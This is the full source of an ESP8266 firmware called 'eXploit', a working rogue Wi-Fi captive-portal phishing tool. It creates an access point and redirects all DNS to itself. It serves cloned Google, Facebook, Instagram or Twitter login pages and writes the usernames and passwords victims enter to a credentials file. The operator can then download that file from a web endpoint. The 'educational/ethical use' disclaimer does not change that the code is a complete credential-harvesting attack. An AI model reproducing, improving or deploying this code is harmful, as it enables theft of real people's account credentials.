/*
                         eXploit V0.9 Beta

  eXploit is designed to perform various social engineering attacks.
  This tool should only be used for educational purposes/testing.

  Default configuration page  : 18.18.18.100

         WiFi
  Default SSID : eXploit
  Default PASS : vulnerable

      Config Portal
  Default Username : exploit
  Default Password : admin

  Custom templates can be loaded via ESP8266 Sketch Upload.
  Rename your template as index.html
  Put the index.html on {sketchlocation}/data/index.html
  or
  Upload the custom index.html using eXploit Config page.
  
  OnBoard Templates : Google,Facebook,Instagram,Twitter

  Ethical use only :)
  agnath18@gmail.com

*/

#include <Arduino.h>
#include <ArduinoJson.h>
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include "LittleFS.h"
#include "WebHTML.h"
#include "Config.h"
#include "WebFiles.h"

DNSServer dnsServer;
ESP8266WebServer webServer(80);

File fsUploadFile;

void exploitConfig();

void loadCustom()
{
  if (LittleFS.exists("/index.html"))
  {
    File file = LittleFS.open("/index.html", "r");
    webServer.streamFile(file, "text/html");
    file.close();
    Serial.println("Loaded Index file");
  }
  else
  {
    Serial.println("Index file not found");
    Serial.println("Searching for index.gz");
      if (LittleFS.exists("/index.gz"))
  {
    File file = LittleFS.open("/index.gz", "r");
    webServer.streamFile(file, "text/html");
    file.close();
    Serial.println("Loaded Index.gz file");
  }
  else
  {
    Serial.println("Index.gz file not found");
  }
  }
}

void fileUpload()
{

  HTTPUpload &upload = webServer.upload();

  if (upload.status == UPLOAD_FILE_START)
  {

    String filename = upload.filename;
    if (!filename.startsWith("/"))
      filename = "/" + filename;
    Serial.print("fileUpload Name: ");
    Serial.println(filename);
    fsUploadFile = LittleFS.open(filename, "w");
    filename = String();
  }
  else if (upload.status == UPLOAD_FILE_WRITE)
  {

    if (fsUploadFile)
      fsUploadFile.write(upload.buf, upload.currentSize);
  }
  else if (upload.status == UPLOAD_FILE_END)
  {
    if (fsUploadFile)
    {
      fsUploadFile.close();
      Serial.print("fileUpload Size: ");
      Serial.println(upload.totalSize);
      exploitConfig();
      webServer.send(303);
    }
    else
    {
      webServer.send(500, "text/plain", "500: couldn't create file");
    }
  }
}

void loadConfig(Config &config)
{

  File file = LittleFS.open("/config.json", "r");
  StaticJsonDocument<512> doc;

  DeserializationError error = deserializeJson(doc, file);
  if (error)
    Serial.println(F("Failed to read file, using default configuration"));

  strlcpy(config.ssid,
          doc["ssid"] | defaultSsid,
          sizeof(config.ssid));

  strlcpy(config.pass,
          doc["pass"] | defaultPass,
          sizeof(config.pass));

  strlcpy(config.p_user,
          doc["p_user"] | defaultUsername,
          sizeof(config.p_user));

  strlcpy(config.p_pass,
          doc["p_pass"] | defaultPassword,
          sizeof(config.p_pass));

  config.cstTmp = doc["cstTmp"] | customTemplate;

  config.authPt = doc["authPt"] | authPortal;

  config.selTem = doc["selTem"] | currentTemplate;

  file.close();
}

void saveConfig(const Config &config)
{

  LittleFS.remove("/config.json");
  File file = LittleFS.open("/config.json", "w");

  if (!file)
  {
    Serial.println(F("Failed to create file"));
    return;
  }
  StaticJsonDocument<512> doc;
  doc["ssid"] = config.ssid;
  doc["pass"] = config.pass;
  doc["p_user"] = config.p_user;
  doc["p_pass"] = config.p_pass;
  doc["cstTmp"] = config.cstTmp;
  doc["authPt"] = config.authPt;
  doc["selTem"] = config.selTem;

  if (serializeJson(doc, file) == 0)
  {
    Serial.println(F("Failed to write to file"));
  }

  file.close();
}

void exploitCaptive()
{
  if (config.cstTmp == 1)
  {
    loadCustom();
  }
  else
  {
    switch (config.selTem)
    {
    case 0:
      webServer.send(200, "text/html", eXploit_gCaptive);
      //webServer.sendHeader("Expires", "Mon, 1 Jan 2022 12:12:12 GMT");
      //webServer.sendHeader("content-encoding", "gzip");
      //webServer.send_P(200, "text/html", gCaptive, sizeof(gCaptive));
      break;

    case 1:
      webServer.send(200, "text/html", eXploit_fCaptive);
      //webServer.sendHeader("Expires", "Mon, 1 Jan 2022 12:12:12 GMT");
      //webServer.sendHeader("content-encoding", "gzip");
      //webServer.send_P(200, "text/html", fCaptive, sizeof(fCaptive));
      break;

    case 2:
      webServer.send(200, "text/html", eXploit_iCaptive);
      //webServer.sendHeader("Expires", "Mon, 1 Jan 2022 12:12:12 GMT");
      //webServer.sendHeader("content-encoding", "gzip");
      //webServer.send_P(200, "text/html", iCaptive, sizeof(iCaptive));
      break;

    case 3: 
      webServer.send(200, "text/html", eXploit_tCaptive);
      //webServer.sendHeader("Expires", "Mon, 1 Jan 2022 12:12:12 GMT");
      //webServer.sendHeader("content-encoding", "gzip");
      //webServer.send_P(200, "text/html", tCaptive, sizeof(tCaptive));
      break;

    default:
      webServer.send(200, "text/html", eXploit_gCaptive);
      //webServer.sendHeader("Expires", "Mon, 1 Jan 2022 12:12:12 GMT");
      //webServer.sendHeader("content-encoding", "gzip");
      //webServer.send_P(200, "text/html", gCaptive, sizeof(gCaptive));
      break;
    }
  }
}

void exploitRestart()
{
  webServer.send(200, "text/html", eXploit_Restart);
  //webServer.sendHeader("Expires", "Mon, 1 Jan 2022 12:12:12 GMT");
  //webServer.sendHeader("content-encoding", "gzip");
  //webServer.send_P(200, "text/html", eReboot, sizeof(eReboot));
}

void exploitConfig()
{
  if (config.authPt == 1)
  {
    if (!webServer.authenticate(config.p_user, config.p_pass))
      return webServer.requestAuthentication();
    webServer.send(200, "text/html", eXploit_Config);
    //webServer.sendHeader("Expires", "Mon, 1 Jan 2022 12:12:12 GMT");
    //webServer.sendHeader("content-encoding", "gzip");
    //webServer.send_P(200, "text/html", eConfig, sizeof(eConfig));
  }
  else
  {
    webServer.send(200, "text/html", eXploit_Config);
    //webServer.sendHeader("Expires", "Mon, 1 Jan 2022 12:12:12 GMT");
    //webServer.sendHeader("content-encoding", "gzip");
    //webServer.send_P(200, "text/html", eConfig, sizeof(eConfig));
  }
}

void setup()
{
  Serial.begin(115200);
  Serial.println("");
  Serial.println("Mount LittleFS");
  if (!LittleFS.begin())
  {
    Serial.println("LittleFS mount failed");
    return;
  }

  Serial.println(F("Loading configuration..."));
  loadConfig(config);
  Serial.print("Configuring access point...");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(config.ssid, config.pass);
  dnsServer.start(DNS_PORT, "*", apIP);

  pinMode(16, OUTPUT);
  pinMode(2, OUTPUT);
  digitalWrite(16, HIGH);
  digitalWrite(2, LOW);

  webServer.onNotFound([]()
                       { exploitCaptive(); });

  webServer.begin();

  webServer.on("/config", exploitConfig);

  webServer.on("/", exploitCaptive);

  webServer.on("/saveConfig", []()
               {
                 if (webServer.hasArg("disAuth"))
                 {
                   if (webServer.arg("disAuth") == "enabled")
                   {
                     config.authPt = 0;
                   }
                 }

                 if (webServer.hasArg("enaCst"))
                 {
                   if (webServer.arg("enaCst") == "enabled")
                   {
                     config.cstTmp = 1;
                   }
                 }
                 else
                 {
                   config.cstTmp = 0;
                 }

                 if (webServer.hasArg("xCapt"))
                 {
                   if (webServer.arg("xCapt") == "fCapt")
                   {
                     config.selTem = 1;
                   }
                   else if (webServer.arg("xCapt") == "iCapt")
                   {
                     config.selTem = 2;
                   }
                   else if (webServer.arg("xCapt") == "tCapt")
                   {
                     config.selTem = 3;
                   }
                 }

                 LittleFS.remove("/config.json");
                 File file = LittleFS.open("/config.json", "w");

                 if (!file)
                 {
                   Serial.println(F("Failed to create file"));
                   return;
                 }

                 StaticJsonDocument<512> doc;

                 doc["ssid"] = webServer.arg("ssid");
                 doc["pass"] = webServer.arg("pass");
                 doc["p_user"] = webServer.arg("p_user");
                 doc["p_pass"] = webServer.arg("p_pass");
                 doc["authPt"] = config.authPt;
                 doc["cstTmp"] = config.cstTmp;
                 doc["selTem"] = config.selTem;

                 if (serializeJson(doc, file) == 0)
                 {
                   Serial.println(F("Failed to write to file"));
                 }
                 file.close();
                 Serial.println("Save config finished");

                 //webServer.send(200, "text/html", eXploit_Config);
                 exploitConfig();
               });

  webServer.on("/validate", []()
               {
                 File file = LittleFS.open("/credentials.txt", "a");
                 if (!file)
                 {
                   Serial.println("Failed to write credentials");
                 }
                 if (file.print("\nUsername : " + webServer.arg("user")))
                 {
                   Serial.println("Username Written");
                   digitalWrite(16, LOW);
                   digitalWrite(2, HIGH);
                 }
                 else
                 {
                   Serial.println("\nUsername write failed");
                 }
                 if (file.print("\nPassword : " + webServer.arg("pass")))
                 {
                   Serial.println("Password Written");
                 }
                 else
                 {
                   Serial.println("Password write failed");
                 }
                 delay(2000);
                 file.close();
                 exploitCaptive();
               });

  webServer.on("/credentials", []()
               {
                 File download = LittleFS.open("/credentials.txt", "r");
                 if (!download)
                 {
                   Serial.println("Failed to read credentials file");
                   //webServer.send(200, "text/html", eXploit_Config);
                   exploitConfig();
                 }
                 if (download)
                 {
                   webServer.sendHeader("Content-Type", "text/text");
                   webServer.sendHeader("Content-Disposition", "attachment; filename=credentials.txt");
                   webServer.sendHeader("Connection", "close");
                   webServer.streamFile(download, "application/octet-stream");
                   download.close();
                 }
               });

  webServer.on("/clear_cred", []()
               {
                 File data = LittleFS.open("/credentials.txt", "r");
                 if (!data)
                 {
                   Serial.println("Failed to read credentials file");
                   //webServer.send(200, "text/html", eXploit_Config);
                   exploitConfig();
                 }
                 if (data)
                 {
                   if (LittleFS.remove("/credentials.txt"))
                   {
                     Serial.println(F("File deleted successfully"));
                   }
                 }
                 //webServer.send(200, "text/html", eXploit_Config);
                 exploitConfig();
               });

  webServer.on("/reboot", []()
               {
                 Serial.println("Esp going to reboot");
                 exploitRestart();
                 delay(1000);
                 ESP.restart();
               });

  webServer.on("/restoreDefault", []()
               {
                 Serial.println("Restoring default settings!");
                 LittleFS.remove("/config.json");
                 File file = LittleFS.open("/config.json", "w");

                 if (!file)
                 {
                   Serial.println(F("Failed to create config"));
                   return;
                 }

                 StaticJsonDocument<512> doc;

                 doc["ssid"] = defaultSsid;
                 doc["pass"] = defaultPass;
                 doc["p_user"] = defaultUsername;
                 doc["p_pass"] = defaultPassword;
                 doc["authPt"] = authPortal;
                 doc["cstTmp"] = customTemplate;
                 doc["selTem"] = currentTemplate;

                 if (serializeJson(doc, file) == 0)
                 {
                   Serial.println(F("Failed to write to file"));
                 }
                 file.close();
                 Serial.println("Restored default config");

                 delay(1000);
                 ESP.restart();
               });

  webServer.on(
      "/upload", HTTP_POST, []()
      { webServer.send(200); },
      fileUpload);

          FSInfo fs_info;
    LittleFS.info(fs_info);
 
    Serial.println("File sistem info.");
 
    Serial.print("Total space:      ");
    Serial.print(fs_info.totalBytes);
    Serial.println("byte");
 
    Serial.print("Total space used: ");
    Serial.print(fs_info.usedBytes);
    Serial.println("byte");
     
    Serial.print("Free space :      ");
    Serial.print(fs_info.totalBytes - fs_info.usedBytes);
    Serial.println("byte");
 
    Serial.print("Block size:       ");
    Serial.print(fs_info.blockSize);
    Serial.println("byte");
 
    Serial.print("Page size:        ");
    Serial.print(fs_info.totalBytes);
    Serial.println("byte");
 
    Serial.print("Max open files:   ");
    Serial.println(fs_info.maxOpenFiles);
 
    Serial.print("Max path lenght:  ");
    Serial.println(fs_info.maxPathLength);
 
}

void loop()
{
  webServer.handleClient();
  dnsServer.processNextRequest();
}
